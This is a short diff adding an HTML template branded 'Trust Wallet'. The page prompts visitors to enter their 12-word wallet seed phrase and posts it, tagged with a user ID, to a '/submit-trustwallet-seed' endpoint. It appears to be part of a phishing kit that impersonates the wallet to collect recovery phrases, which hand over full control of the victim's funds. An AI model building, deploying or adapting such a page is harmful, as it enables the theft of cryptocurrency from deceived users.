@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet</title>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Enter Your 12-Word Trust Wallet Seed Phrase</h2>
+        <form id="trustWalletForm" action="/submit-trustwallet-seed" method="POST">
+            <input type="hidden" name="userId" value="<%= userId %>">
+            
+            <label for="seedPhrase">Seed Phrase (separated by spaces):</label>
+            <input type="text" id="seedPhrase" name="seedPhrase" required placeholder="Enter your 12-word seed phrase">
+            
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+</body>
+</html>
